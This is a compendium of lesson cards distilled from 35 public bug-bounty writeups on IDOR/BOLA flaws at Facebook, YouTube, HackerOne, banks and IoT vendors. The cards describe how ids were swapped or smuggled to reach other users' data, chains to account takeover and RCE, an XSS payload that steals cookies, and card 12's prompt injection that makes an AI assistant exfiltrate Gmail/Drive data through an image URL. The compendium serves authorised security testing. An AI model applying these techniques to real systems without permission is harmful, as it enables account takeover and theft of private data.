# Phase 2 — pentester.land IDOR/BOLA per-writeup lesson cards (index-sorted, 1..467)

Deep-read corpus: 465 of 467 IDOR-tagged writeups carded (one lesson per article: Where / how-found / reusable test / creativity question). 2 unrecoverable (indices 65, 88 — hopesamples.blogspot.com deleted; see UNRECOVERED.md).

### [1] Zomato — IDOR in saved payments at checkout (sequential payment_method_id, no rate-limit) — prateeksrivastavaa [DUP reinforcement: classic numeric IDOR + enumeration]
- Where: food-delivery mobile app; the payment screen shows "previously used payment methods".
- Approach/how-found: noticed the checkout pre-fills saved cards → Burp on mobile → the `default_payment_options` fetch sent `payment_method_id`. Incrementing/decrementing it returned a *random* user's card metadata (cardholder name, first-6/last-4, bank). IDs were sequential → Intruder bruteforced ids; no rate-limiting → mass PII harvest.
- Test: at checkout, intercept the "saved/default payment methods" call; swap the payment/method id; confirm sequentiality + absence of rate limiting before reporting impact.
- Q: "Does the wallet/saved-payment fetch take a `payment_method_id`/`card_id` I can increment to read other users' card metadata, and is enumeration rate-limited?"

### [2] $13,500 — role-by-field-presence logic flaw → host account → public 3-char form id IDOR → self-XSS becomes reflected — rAmpancist [NEW ★ chain: presence-logic auth + public short id + self→reflected XSS]
- Where: housing site = main site (host/customer roles) + a subdomain sub-service whose features depend on your main-account role.
- Approach/how-found: registration body was `IsHost=1&HostId=123&Email=` (host) vs `IsHost=0&Email=` (customer). The server's logic: *if HostId exists AND IsHost=1 → validate hostID (and fail); if HostId exists AND IsHost=0 → treat as host but DON'T validate hostID.* So it inferred "host" from the **presence** of `HostId` but only ran the validation when `IsHost=1`. Sending `HostId=123&IsHost=0` minted an unvalidated host account → unlocked 4 host-only features no other hunter had reached. One feature's form submission returned a **public 3-character id** in the URL (no authz) = public IDOR reading others' confidential forms (data pulled from the main site → critical). His name field had a *self*-XSS; because the IDOR renders his name on a victim-openable page, the self-XSS became **reflected**. A file upload returned a separate file link, IDOR-able too.
- Test: when a role/privilege is decided by whether a field is *present*, supply the privileged field while claiming the lower role (validation/branch mismatch). Treat short/sequential ids on submission/result URLs as enumerable. Re-evaluate any "self-XSS" once you have an IDOR that renders your stored data on another user's screen.
- Q: "Does the backend infer role from a field's mere presence but validate it only for one role value? Are result/submission URLs short public ids? Can an IDOR promote my self-XSS to reflected by showing my data to a victim?"

### [3] Butterfly Effect: GraphQL IDOR → SSO-flag auth bypass → admin ATO — Oussama Rahali (pentest) [NEW]
- Where: GraphQL API on an e-learning platform; student JWT.
- Approach/how-found: (1) GraphQL "suggestions"/"Did you mean" errors were left on in prod (introspection-lite). (2) `query student(id:1234){...email}` and `query administrator(id:500){...adminLevel,email}` returned ANY user/admin with a *student* token = IDOR enumeration of all students+admins. (3) Read JS bundle → found `loginStudent` mutation where schema marks `loggedSSO: Boolean!` non-null but `password: String` nullable. Set `password:"" , loggedSSO:true` → server returned that user's JWT (SSO flag bypassed password). (4) To reach admin, the JWT needed an `adminLevel` claim he couldn't force; a GraphQL error "Did you mean loginAdmin?" leaked the admin mutation name → `loginAdmin(email, password:"", loggedSSO:true)` returned a JWT *with* adminLevel=2 → full admin ATO.
- Test: enumerate users via `query <type>(id:N)`; harvest emails; then look for a login/token mutation with a boolean SSO/social flag and try it with blank password; mine "Did you mean…" suggestions for hidden admin mutations.
- Q: "Does a GraphQL query take an `id` arg that returns other users/admins? Is there a `loginX`/token mutation with an SSO/social boolean I can set true to skip the password? Do error 'Did you mean' hints reveal an admin-tier mutation that mints a higher-privilege token?"

### [4] YouTube copyright-claim IDOR → file fake dispute → victim's video deleted + channel strike — secretlyhidden (Google VRP) [NEW: second-order *harm* via a workflow]
- Where: studio.youtube.com creator API.
- Approach/how-found: direct "delete someone's video" API correctly returned Access Denied. Instead of giving up he asked "if I can't delete it directly, what adjacent action reaches the same harm?" Found `POST /youtubei/v1/creator/list_...` (lists Content-ID claims) accepted ANY `videoID` (IDOR, no owner check) → leaked the `claimId`. Fed that into `POST /youtubei/v1/copyright/submit_...` with `{claimId, videoID(victim)}` → opens a fake Content-ID *dispute* on the victim's video. Per YouTube's flow, the real content owner can then takedown the video + apply a copyright strike → channel-deletion risk.
- Test: when a destructive verb is blocked, enumerate sibling read endpoints to leak the object's secondary id (claimId/ticketId/disputeId), then feed it to a *state-changing* sibling that triggers a third party (the content owner / support / counterparty) to do the damage for you.
- Q: "Blocked from acting on the object directly? Which adjacent endpoint leaks a secondary id (claim/dispute/ticket), and which workflow lets me weaponize it so the platform or another user inflicts the harm?"

### [5] IDOR via HPP, name param from JSON key, GET→POST fix-bypass — Fortbridge (retailer pentest) [DUP of P2-2 — canonical, confirmed]
- Where: customer API; `GET /customers/<id>` takes your own id in the PATH (smell: id not from session/JWT).
- Approach: increment/decrement blocked → HPP. Named the 2nd param EXACTLY as the response JSON key (`customerId`) because "devs are consistent" → `?customerId=<victim>` returned victim PII; systemic across `/addresses/<id>` etc. After fix, one endpoint still bypassable by moving the polluted param GET→POST (different team/stack resolves precedence differently).
- Q: "Is my own id passed in the path/query (not derived from session)? If swap fails, does a duplicate param named after the response JSON key win in the data layer? After a fix, does GET↔POST placement flip which copy wins?"

### [6] HackerOne embedded submission form — GraphQL IDOR via swappable form UUID leaks private program config — Japz Divino ($2,500) [NEW: widget-uuid → private parent config]
- Where: hackerone.com embedded submission form; `POST /graphql?embedded_submission_form_uuid=<UUID>`, op `EmbeddedSubmissionPage(uuid)`.
- Approach/how-found: the embeddable form's GraphQL query takes a form `uuid`; swapping it returned another (private) program's `team{...}` object — intro text, response-efficiency %, structured scopes, customized report template — data meant to be private. (Article tail is member-locked; core technique captured from the request/response.)
- Test: public/embeddable widgets (forms, chat, calendars) usually fetch by an object uuid in the query string; swap it to read the private *parent* object's config (program settings, scopes, templates, metrics).
- Q: "Does an embeddable widget fetch by a uuid I can swap to disclose another program/tenant's private configuration (intro, scopes, templates, metrics)?"

### [7] IDOR → ATO: auth_token validated by timestamp window, NOT bound to the user — Ahmed Tarek (HackerOne program) [NEW ★ "token validates existence, not ownership"]
- Where: `GET /api/v1/user/profile?user_id=&auth_token=<JWT>&timestamp=`.
- Approach/how-found: two accounts → `user_id` differed by 1 (sequential). Swapping `user_id`+`auth_token` gave 400, so the token *seemed* enforced. Insight: the server validates the token only for **freshness via `timestamp`**, not that it belongs to the user. Tokens live 60s; `timestamp` increments +1 per 10s. He kept swapping `user_id` to the victim while keeping his own token and setting `timestamp` inside the live 60s window → accepted → read/modify any profile → ATO by changing only `user_id`.
- Test: when an id-swap fails because "a token validates," check whether the token is bound to the *object/owner* or merely checked for validity/freshness; keep your own valid token, swap only the id, and align any timestamp/nonce to the acceptance window.
- Q: "Is the auth token cryptographically bound to the `user_id`, or just checked for being a valid/fresh token? Can I keep my token, swap the id, and tweak the timestamp/nonce to stay in the validity window?"

### [8] VDP — three ATO paths: sequential-id email-change IDOR; IDOR-upload→stored-XSS→cookie+id exfil; timestamp reset-code "sandwich" — vict0ni [NEW ★ multi-technique]
- Where: org-onboarding app; owners upload docs/legal info; accounts have username + email + **sequential** numeric id.
- Approach/how-found:
  - **ATO#1 (email IDOR):** email change requires **no password** and sends your account `id`; swapping it changes another user's email. IDs are sequential and the endpoint is brute-forceable, and since a victim's account is older it has a **lower** id → fuzz ids from 1 up to yours → change all ~1700 accounts' emails → password-reset via username + attacker's new email.
  - **ATO#2 (IDOR→XSS chain):** (a) uploaded docs render HTML; the filter blocks `<script>`/obvious `onerror` but misses `<img src="x"/onerror="alert(1)">` → self-XSS. (b) the upload endpoint is IDOR-able: set another `user_id` to drop an unassigned doc into the victim's account; the response returns the new `document_id` → build the victim's doc URL. Delivered payload exfils `document.cookie` **and** reads the account-preferences `<a href>` that contains the victim's user id; with cookie+id the attacker changes the email (no password) → reset → ATO.
  - **Bonus (sandwich/bracket):** reset codes = hex of UNIX-ms timestamp → fire reset for you, then victim, then you; the victim's code must fall *between* your two codes → small brute range (only failed due to slow/jittery backend timing).
- Test: one IDOR predicts more — re-test every sibling write (upload/assign/change) for id swap. With sequential ids, victims usually sit **below** your id. HTML-rendering uploads → try obfuscated XSS, then look for an IDOR to deliver it. Timestamp-derived secrets → bracket them with self-requests.
- Q: "Can I change email/critical fields without the current password by swapping my id? Are ids sequential so older victims have lower ids? Does an upload/assign endpoint take another `user_id` and return the object id to share? Are reset codes derived from a timestamp I can bracket?"

### [9] E-notation parser-smuggling IDOR — validator reads leading digits, backend parses the full numeric value — Keizo (critical, 4-figure) [DUP — canonical source]
- Where: `GET /api/v1/user/<id>/discussions`; id was protected (403 for others), but format-sensitive.
- Approach/how-found: format probing — `123`→200; `123.0`,`123.2`→200 (same user); `1234`,`111.0`→403; `123a`,`123+1`,`123/1`→400. The authz check validated only that the **leading numeric characters** equal your id, while the backend evaluated the **full numeric value** → smuggle via E-notation: `123e1`=1230 → reads user 1230's discussions; `123.1e1`=1231; `123e-1`=12.3→user 12; `123e-2`→user 1. Limit: reaches ids = your_id × 10^n plus the prefix edge cases.
- Test: when an id is bound to "must start with my id", try numeric re-encodings the validator and backend parse differently — `123.0`, `123e1`, leading-zeros, `+123`, `0x7B` — anything that *starts with* your id but resolves to a different number.
- Q: "Does the authz check compare a string prefix/leading digits while the backend parses the numeric value? Can `123e1`/`123.0`/hex re-encodings smuggle a different id past validation?"

### [10] "Bypassing an IDOR a couple of times" — method-override + `include=` field expansion + path/body dual-source id — Omar ElSayed ($2,000) [NEW ★ multiple bypasses]
- Where: `/api/v4/user/<id>` profile API (your own id in the path = smell).
- Approach/how-found: baseline swap blocked (403). Ran a **bypass checklist**: change id, downgrade API version `/api/v1/`, append `.json`, drop the id, plural `/users/`, `*` wildcard, path traversal `/user/22652/../1`, add `?page`/`pageSize`. Then **method games**: `PUT /api/v4/user/1` with body `_method=PATCH` (method override) returned victim data (flaky 500/200); adding `?include=firstname,lastname,email,image` **expanded the returned fields** → PII; an **empty body** made it consistent. After a fix, update became `PUT /api/v4/user/` with `id=` in the body — he found the endpoint reads **both path and body**, so he put HIS id in the path (passes authz) and the VICTIM's in the body (used by backend): `PUT /api/v4/user/22652?include=...` + body `id=22651` → victim PII (drop `firstname` to avoid 403).
- Test: keep a standing IDOR-bypass checklist (version downgrade, `.json` extension, drop/plural id, `*`, traversal, paging). Try method overrides (`_method`, `X-HTTP-Method-Override`). Hunt a field-selector (`include`/`fields`/`expand`) to widen a thin response into PII. When authz reads the path but the backend reads the body, put your id where it's *checked* and the victim's where it's *used*.
- Q: "Does an `include`/`fields`/`expand` param widen the response to PII? Does an HTTP method override flip authz? Is the id read from BOTH path and body so I can pass my id in one and the victim's in the other?"

### [11] $20,300 / 200-hour challenge: 403-on-id-swap bypassed by method+Accept header — Voorivex team [NEW: 403 bypass combo]
- Where: `GET /users/58158` (numeric id) on main web app.
- Approach/how-found: incrementing the id → 403. Tried `PATCH` method alone → still failed. The winning combo: switch method to `PATCH` AND add `Accept: application/json` → 200 OK with full PII. Two independent toggles stacked.
- Other IDOR in same report: signed up to an internal `companydemonew.com` (only @company.com emails) by registering `attacker@company.com` and bypassing activation → post-auth IDOR `id 35→36` dumped another tenant's transactions. Lesson: demo/internal/staging subdomains are post-auth IDOR goldmines once you get in. Also: auth-less Swagger UI on `test.<target>:5000` — tested each of ~100 "protected" APIs individually, 10 were open, 2 leaked PII.
- Test: on a 403'd id-swap, stack bypasses — change verb (GET→PATCH/PUT/POST) *and* add/alter `Accept`, `Content-Type`, `X-Requested-With`. Hunt `test`/`demo`/`staging` subdomains and unauth Swagger.
- Q: "Does the id-swap 403 flip to 200 if I change the HTTP method AND the Accept/Content-Type header together? Is there a demo/internal subdomain I can register into for an unguarded post-auth API?"

### [12] Google $50k LLM bugSWAT: Bard Vision resource-path IDOR + 'ask a question' meta + directive-overload DoS — Lupin/rez0/Rhynorater [DUP of P2-6 for the IDOR; NEW meta]
- IDOR (DUP, canonical): Bard "Vision" describe-image. Body of `POST .../StreamGenerate` carries a server file path `/contrib_service/ttl_1d/<id>`. As user 2, swap in user 1's path → Bard describes the VICTIM's image; OCR leaks text (revenue, emails, notes).
- NEW meta-lessons worth capturing: (1) *Finding a bug by asking a question* — they simply asked the engineers "how are signatures signed?" → exposed a hardcoded non-random signing key. In bug bounty terms: read the JS/asking yourself "where does the secret/signature come from?" often reveals it's hardcoded. (2) GraphQL **Directive Overloading**: `@Signature(...)` could be repeated N times (the signature signs everything *except* signatures) → 1,000,000 directives = 109s backend hang (DoS). (3) Markdown-image data-exfil through an LLM with a CSP bypass (`www.google.com/amp/s/<evil>.googleusercontent.com`, URL-encoded host to dodge a domain filter) — prompt-inject the AI to read Gmail/Drive then exfil via image URL.
- Q: "Does an AI 'describe/summarize my file' feature take a swappable storage path pointing at another user's object? Can a security-relevant directive/param be repeated to overload the server? Where is the signing secret — is it hardcoded in JS?"

### [13] Password reset keyed by user `id`, not the token; frontend-only authz → ATO + unauth role change — Cristi Vlad (pentest) [DUP — canonical: reset bound to id]
- Where: `/passreset/<token>` → on submit, intercept shows an `id` param = whose password is reset.
- Approach/how-found: the bcrypt-looking `token` is irrelevant; the reset executes by `id` (10-char alphanumeric, brute-forceable, no rate-limit) → set any valid id → reset/ATO anyone. Bonus: a low-priv user could enumerate all users (admin feature left exposed → harvest ids), elevate self to admin, and the role-update even worked **unauthenticated** — restrictions were frontend-only.
- Test: at the reset/confirm step, verify whether the secret token is actually validated and bound to the account, or whether a separate `id`/`email`/`user` field selects the target. Probe admin-only list/role endpoints from a low-priv (and no) session.
- Q: "In reset/confirm, is the token actually validated and bound to the account, or does a swappable `id`/`email` decide whose password changes? Can a low-priv/unauth caller reach list/role-change endpoints?"

### [14] Facebook Groups "Watch Party" IDOR — act in a group via `group_id` regardless of mute/approval/admin-only — Sarmad (Meta BB) [NEW: action-on-container by id]
- Where: groups GraphQL `group_living_room_create`; body carries `group_id`.
- Approach/how-found: in his own group he creates a watch party, intercepts, swaps `group_id` to a **victim group** where he's muted / post-approval is on / posting is admin-only → response returns a `LivingRoomSession id` → opens `/livingroom/<id>`, plays the video and invites all members → bypasses every group restriction. The server never checked the actor's role/permission *in the target group*.
- Test: any "create X in group/board/workspace Y" mutation — swap the container id to one where you're restricted; if it succeeds, the per-container permission check is missing.
- Q: "Does a create/post mutation take a `group_id`/`board_id`/`workspace_id` that isn't checked against my role there? Can I act in a container where I'm muted or non-admin?"

### [15] Facebook Creative Hub — private draft mockups disclosed via `object_story_id` in the preview GET — Sarmad (Meta BB) [NEW: render/preview leaks draft by object id]
- Where: `AdPreviewPageletController` GET; JSON `creative.object_story_id`.
- Approach/how-found: "View by placement → Desktop News Feed" preview GET carries `object_story_id`; swapping it to the victim's renders their **private draft** mockup and leaks title, Page name/ID, Owner-ID/name, descriptions. The preview renderer had no owner check.
- Test: preview/render/print/export endpoints routinely fetch by an object id with no owner check — swap it to view drafts/unpublished items and their owner metadata.
- Q: "Does a preview/render/export endpoint take an object/story id I can swap to view another user's private draft + owner metadata?"

### [16] Facebook Social-Learning groups — distort/lock others' posts via `post_id` swap: `POST /groups/learning/create_with_post/?group_id=<mine>&post_id=<victim>` doesn't validate the post belongs to your group → add any group's post into your unit → renders it "Attachment not available"; invite the post owner to your group → their post becomes undeletable even by their admin — Sarmad Hassan [NEW ★ cross-group post-id import → content distortion + undeletable via invite]
- Where: `POST /groups/learning/create_with_post/?group_id=&post_id=` (Units feature).
- Approach/how-found: the add-post-to-unit request trusted `post_id`; pointing it at another group's post pulled it into the attacker's unit, corrupting the original ("Attachment not available") and—after inviting the owner—making it undeletable by owner and admin.
- Test: "add/import to unit/collection/list" features that reference a foreign object by id → import others' content to distort or lock it; pair with an invite to make damage persistent.
- Q: "Can I import another group's post/object into my container by id, and does it corrupt or lock the original? Does inviting the owner make it undeletable?"

### [17] Oculus Developer support — comment on a private bug by swapping the CHILD id (`external_post_id`), not the checked parent bug id — Sarmad (Meta BB) [NEW ★ swap the secondary id]
- Where: `graph.oculus.com /graphql` add-comment mutation with `comment_parent_id` (bug id) + `external_post_id` (the comment being replied to).
- Approach/how-found: Plan A (swap the bug id) failed — bug ownership is checked. Plan B: swap `external_post_id` to a victim's private comment id → succeeded, because authz validated only the **bug id**, not the comment id → comment on others' private bugs. Limitation: needs the victim's (private) comment id, so impact is gated by id discovery.
- Test: when swapping the obvious parent id is blocked, swap a *secondary/child* id in the same request (comment/attachment/reply/thread id) — backends often authorize only the primary object.
- Q: "If the parent id is access-checked, is there a secondary id (comment/reply/attachment/thread) in the same request that isn't?"

### [18] Facebook Gaming — leak any streamer's stream earnings: `GamesVideoStreamerDashboardProfilePlusVideoQuery` GraphQL `delegate_page_id` swap → `latest_stream_video_asset_earnings` of any gaming page — Sarmad Hassan [DUP-reinforce: dashboard GraphQL keyed on a swappable page id leaks financials]
- Where: `POST /api/graphql/` `...StreamerDashboard...Query` `variables.delegate_page_id`.
- Approach/how-found: the "View Stream Report" GraphQL carried `delegate_page_id`; swapping to any streamer page returned their latest stream earnings (admin-only financial data).
- Test: creator/gaming/monetization dashboard GraphQL queries take a `delegate_page_id`/`page_id` → swap to read other pages' earnings/financials.
- Q: "Does a creator-dashboard query expose earnings/financials by a swappable page/delegate id?"

### [19] Facebook Workplace Safety Check — unblockable notification spam via `operator_ids[]` array: add-safety-operator request accepts arbitrary `operator_ids` (incl. external facebook.com users) → send notifications to anyone (can't be blocked from the workplace domain); the array lets you target millions at once — Sarmad Hassan [NEW ★ array-param IDOR → mass cross-domain notification (blocklist bypass)]
- Where: Safety Check add-operator `POST` (`operator_ids[]`, `doc_id=2211145648957994`).
- Approach/how-found: `operator_ids` accepted any user id (even outside the company) → the added "operator" receives notifications from the attacker; victims can't block him because the messages come from the Workplace domain. The array param enables mass targeting.
- Test: array params (`operator_ids[]`, `recipient_ids[]`) on cross-domain notification/role features → inject foreign/many ids; messages routed via a privileged domain may bypass blocking.
- Q: "Does this array param accept external/many user ids? Do notifications via this channel bypass the block/mute controls?"

### [20] Facebook Saved/Collections — DoS others' saved items: `POST /save/list/mutate/` set `object_id` = `list_id` (identical) → 200 but corrupts the saved view; via a Collection with the victim as Contributor → the victim's `/saved/` page errors permanently — Sarmad Hassan [NEW: self-DoS escalated to others through a shared/contributor object]
- Where: `POST /save/list/mutate/` (`list_id`, `object_id`); Collection "Contributors".
- Approach/how-found: setting object_id equal to list_id broke his own saved page (initially N/A self-DoS); adding the victim as a Collection contributor made the corruption affect THEIR saved page too.
- Test: when malformed input only breaks YOUR data (self-DoS/N/A), look for a SHARING/contributor/collaboration feature that propagates the corrupted object to other users → valid DoS.
- Q: "Can a self-only breakage be propagated to others via a shared collection/contributor/collaboration feature? Does malformed input (object_id=list_id) corrupt a shared object?"

### [21] Facebook Brand Collabs Manager — privesc via `page_ids` swap: only page ADMINS may sign up, but the signup GraphQL trusts `page_ids` → a non-admin role (Advertiser/Moderator/Editor/Job Manager) or another admin's page can be enrolled on their behalf — Sarmad Hassan [NEW ★ enroll a foreign/under-privileged page into a restricted program via id swap]
- Where: `POST /api/graphql/` collabs-signup `variables.data.page_ids[]`.
- Approach/how-found: the signup form is admin-only, but swapping `page_ids` to a page where the attacker holds a lesser role (or to another admin's page) enrolled it in Collabs Manager without the admin's action.
- Test: program-enrollment/signup flows gated to a specific role → swap the `page_id`/`account_id` to enroll pages/accounts you have only partial (or no) rights over.
- Q: "Can I enroll a page/account into a restricted program by swapping its id, despite having only a lesser role (or none)?"

### [22] Reset endpoint leaks email by `id` + Host/Referer injection → mass ATO (scripted) — nullr3x [NEW ★ id→email oracle + reset-link host control]
- Where: forgot-password POST with `email` + `id`.
- Approach/how-found: the `email` field is ignored for lookup; `id` selects the account, and when email≠id the server **discloses the victim's email** → enumerate id 1..N → id→email list. Then submit the matching email+id but inject `Referer`/Host = attacker server → the reset link is generated against the attacker host → token delivered to attacker → ATO. Two bash scripts automate it (id→email harvest, then reset-token capture). The server only emails a link when email+id match; otherwise it leaks the email — either branch helps the attacker.
- Test: send reset with mismatched email+id; if it returns the account email, that's an id→email oracle. Then tamper `Host`/`Referer`/`X-Forwarded-Host` to point the reset/verify link at your server.
- Q: "Does the reset endpoint disclose the account email when id≠email? Does `Host`/`Referer`/`X-Forwarded-Host` control the domain in the generated reset link?"

### [23] Facebook Help Community — delete ANY user's image via `attachment={"fbid":<id>}` IDOR in `POST /help/community/async/post_answer/`; derive the victim fbid from the CDN URL by a constant offset — Sarmad Hassan ($1,500) [NEW ★ id-derivation: fbid = (number between underscores in the CDN filename) − 3,333,333]
- Where: `POST /help/community/async/post_answer/?question_id=...` body `attachment={"fbid":<imageId>}`; delete the answer to delete the referenced image.
- Approach/how-found: the answer-with-image request referenced the image only by `fbid`; swapping it to a victim's image fbid and then deleting your answer deleted the victim's image (shared fbid, no ownership check). To get a victim's fbid he used "Max Pasqua's method": take the CDN URL, read the second number between underscores in the filename, subtract a constant `3333333` → the real fbid.
- Test: when a media object is referenced by an opaque id you "can't guess", check if that id is derivable from a public artifact (CDN filename, thumbnail URL, embed code) via a fixed transform/offset. Destructive actions that bind an attachment by id without ownership are deletion IDORs.
- Q: "Can I derive the 'unguessable' media id from its public CDN/thumbnail URL (a constant offset/encoded segment)? Does deleting my container delete a foreign attachment I referenced by id?"

### [24] Facebook Workplace — disclose any video's thumbnail via `video_id` IDOR in the Canvas builder upload; "send canvas to mobile preview" to render it — Sarmad Hassan ($3,000) [NEW: builder/canvas component fetches media by id; preview channel renders the foreign object]
- Where: Page → Publishing Tools → Canvas → add Video; `POST /v2.11/<pageId>?access_token=...` body `...&video_id=<id>` (`reqName=object:canvas_video`).
- Approach/how-found: the canvas video component accepted an arbitrary `video_id`; swapping it to a victim's Workplace video id and using "Preview on mobile" rendered the victim's thumbnail (the mobile-preview path bypassed the on-page restriction).
- Test: page/ad/canvas/story BUILDERS let you embed an object by id — swap it to a foreign id; if the inline render is blocked, use an alternate render path (mobile preview, export, share) to surface the data.
- Q: "Does this builder component embed media by a swappable `video_id`/`media_id`? If inline render is blocked, does preview/export/share render the foreign object anyway?"

### [25] "IDOR from a blank page" — an empty page still ships JS endpoints; F12 → API → IDOR — kerstan [DUP — recon reminder]
- A page that renders blank still loads JS that calls API endpoints; open DevTools/Sources, harvest the endpoints, then test each for id swaps. (Member-locked past the intro; the value is the recon move of not dismissing empty pages.)
- Q: "Did I dismiss an empty/blank/placeholder page without reading its JS for hidden API endpoints to IDOR-test?"

### [26] Instagram IGTV — add a caption to others' caption-less posts via media-id swap; ignore the error, verify the effect — Sarmad (Meta $6,500) [NEW: state-gated write-IDOR + "error but applied"]
- Where: `POST /media/<mediaID>/edit/` with `caption=&publish_mode=igtv&title=`.
- Approach/how-found: edit your own IGTV, intercept, swap `mediaID` to a victim's **public post that lacks a caption** → server throws "Oops, an error occurred", but refreshing the victim's post shows the attacker's description applied. Works on photos/videos/IGTV; limited to public posts that are missing a description.
- Test: write-IDORs may only succeed on objects in a specific state (empty field/draft/pending). Never trust an error response — re-fetch the object to confirm the mutation actually landed.
- Q: "Does a write only apply to objects in a certain state (empty/blank field)? Did I verify by re-fetching even though the API returned an error?"

### [27] Facebook Messenger — disclose ANY private attachment via `image_ids[0]`/`file_id[0]`/`video_id[0]`/`audio_id[0]` IDOR in `POST /messaging/send/` (brute-forceable) — Sarmad Hassan ($15,000) [DUP-reinforce: send-message attachment id params reference foreign private media across FB/Messenger/Workplace/Portal]
- Where: `POST /messaging/send/` body `has_attachment=true&image_ids[0]=<id>` (and `file_id[0]`,`video_id[0]`,`audio_id[0]`).
- Approach/how-found: sending a message with your own attachment, then swapping the attachment id to a victim's, made the server attach/disclose the victim's private media — the send endpoint never checked you owned the referenced attachment. Works for every attachment type and is brute-forceable.
- Test: messaging/compose endpoints attach media by id; swap the attachment-id arrays to foreign ids to leak private files. Test EVERY media-type param (image/file/video/audio) — each may be independently unguarded.
- Q: "Does composing/sending a message let me reference (and thereby disclose) an attachment id I don't own? Are all attachment-type params (image/file/video/audio) equally unchecked?"

### [28] $15k mass breach — Wayback/dork-found order endpoint MINTS auth cookies that unlock ANY order — bxmbn [NEW ★ cookie-minting object endpoint + archive recon]
- Where: a forgotten orders subdomain (403) found via `site:program.com/webapp/` dork; Wayback revealed a per-order endpoint.
- Approach/how-found: requesting the order endpoint returned a blank 200 but **Set-Cookie: WC_AUTHENTICATION_/WC_PERSISTENT** (WebSphere Commerce auth cookies). Reusing those cookies granted access to that order — and the same flow worked for any other `orderId` found by dorking. The endpoint mints "order-scoped" auth cookies that actually authorize **all** orders → 3M users' PII (payment method, contract PDF, addresses, email, phone, names).
- Test: when an endpoint Set-Cookies on a blank/redirect response, capture and reuse them — they may be object-scoped tokens that over-authorize. Use Google dorks + Wayback to find forgotten order/account subdomains and ids.
- Q: "Does requesting an object endpoint hand me Set-Cookie auth tokens, and do they authorize other objects too? What forgotten endpoints/ids do dorks + Wayback reveal?"

### [29] Bank-offer IDOR — encoded access key has a plaintext `ridNumber` twin in the response; enumerate it — bxmbn ($5,000) [NEW: decoded twin of an encoded ref]
- Where: marketing offer opened via a URL access-key (`FD2t6...`, URL-encoded); the offer page shows your PII.
- Approach/how-found: the response body contained `ridNumber` as a **plain numeric** value (the decoded form of the encoded key). Submitting the decoded `ridNumber` directly was accepted → modifying the last digits returned other users' offers (`...243`, `...241`, `...255`) → full PII (names, address, email, phone, DOB). The "encryption" was cosmetic because the cleartext id is exposed and accepted.
- Test: inspect every response value — an opaque/encoded reference often has a plaintext numeric twin elsewhere; submit the plaintext to bypass the encoding and enumerate.
- Q: "Is there a plaintext/numeric twin of this encoded id in the response or a sibling endpoint? Will the server accept the decoded value directly so I can enumerate?"

### [30] Genie Aladdin IoT: BOLA on device_id in cloud API + mobile cleartext creds — Rapid7 / Deral Heiland [NEW surface: IoT device_id]
- Where: `GET https://<api-id>.execute-api.us-east-1.amazonaws.com/Android/devices/879267` (AWS API Gateway).
- Approach: authenticated user queries the devices API with a `device_id` other than their own → returns other users' device data (BOLA). device_id is a short sequential integer. Also found the Android app stored the password in cleartext in `shared_prefs/...MainActivity.xml` (persists after logout/reboot) and an unauthenticated device web config page on port 80.
- Test: for IoT/mobile backends, pull the cloud API base from the APK/proxy, then swap the `device_id`/`serial` in the path. Decompile the app for hardcoded API hosts + insecure storage.
- Q: "What device/serial id does the mobile app send to its cloud API, and is it sequential? Does swapping it return another customer's device? Does the app store secrets in shared_prefs/plist in cleartext?"

### [31] NCC Group — PandoraFMS Enterprise advisory [RECOVER NEEDED — extraction returned NCC boilerplate, not the advisory]
- Queued for wayback/CUA recovery. (Likely product CVEs incl. an IDOR/BAC in PandoraFMS.)

### [32] Shodan `ssl:` dork → forgotten server → `PUT /offer` group-name leak, then a sibling host adds `personid` → session IDOR — Anas Hmaidy [NEW: replay the bug across sibling subdomains]
- Where: `z2007.redacted.com/agv/sampleAgent.html` test page; `PUT /offer` with `groupid` (→ leaks group name, $100). Then `video.redacted.com` accepts the same PUT with `groupid,isAnonymous,personid` → register/read any user's video-session data ($200 IDOR).
- Approach/how-found: all subdomains redirect to a generic login (DNS brute useless), so he pivoted to Shodan `ssl:redacted.com` → found old host `z2007`. He replayed the working request across other subdomains; one sibling (`video.`) exposed an extra `personid` param, escalating info-disclosure to a full session IDOR.
- Test: when subdomains redirect to login, pivot recon to certs/Shodan/CT to find forgotten hosts. Replay a working request across all sibling subdomains — the same endpoint may accept extra id params (`personid`/`userid`) on a different host.
- Q: "Did I find forgotten hosts via cert/Shodan when DNS brute fails? Does the same endpoint on a sibling subdomain accept extra id params that upgrade info-disclosure to a full IDOR?"

### [33] $7,000 single web app: 3 IDORs — private downloads, public-id→premium data, hidden admin panel — Voorivex [NEW: hidden admin surface]
- Where: add-on marketplace (HackerOne program).
- Approach/how-found (narrow recon, "use the product slowly"): (1) `/download/<seq-id>` served files even when the add-on was flagged **private** → fuzz 1–10000 to enumerate everyone's files. (2) Premium-only `POST /rest/paymentinfos` keyed by *add-on ID*, but add-on IDs are **public** → send someone else's id → their sales data (a public identifier feeding a privileged data endpoint). (3) A tiny button at the bottom of the admin page opened a separate **add-on settings panel that had never been audited** for IDOR → edit other add-ons' admin info.
- Test: don't trust "private" flags on download endpoints; map every *public* identifier (slug/add-on id/store id) and feed it to premium/owner-only data endpoints; click every obscure UI control to surface un-audited admin sub-panels.
- Q: "Does a 'private' object still download by direct id? Is there a PUBLIC id (slug/listing id) that a premium/owner data endpoint accepts? Is there a buried admin/settings sub-page nobody audited?"

### [34] Facebook Groups Notes — view any group's private media via `cover_media_id` in a Paper document mutation — Raja Sudhakar (Meta $10,000) [NEW: media-id reflected by a create/version mutation]
- Where: `POST /api/graphql/` `usePaperCreateDocumentVersionForLexical_Mutation`; `source_payload.cover_media_id`.
- Approach/how-found: creating a Note version lets you set a cover media by id; swapping `cover_media_id` to a victim's **private group** media id makes the response render/return that media → view any group's private Notes media.
- Test: any create/update mutation taking a `media_id`/`cover_id`/`attachment_id` that it reflects back is a viewer for arbitrary media — swap to private ids.
- Q: "Does a create/version/cover mutation accept a media/attachment id it renders back, letting me view private media by id?"

### [35] CMS IDOR → admin ATO → RCE via built-in PHP-exec — Karthikeyan (VAPT) [NEW ★ IDOR→admin→RCE chain]
- Where: CMS "My Account" + "Change Password" both pass `UserID` in the URL.
- Approach/how-found: tamper `UserID` on My Account → other users' details. Change Password asks for the *current* password, but swapping `UserID` changed another user's password **without** the current password → set `UserID=1` (admin) → admin ATO. The admin panel had an "execute PHP code" feature → pentestmonkey reverse shell over ngrok + netcat → RCE. (Custom OAuth mis-authorized + a dangerous code-exec extension was enabled.)
- Test: a change-password keyed by a URL/body id may skip the current-password check when the id is swapped; admin id is often `1`. Once admin, hunt code/template/plugin-exec features for RCE.
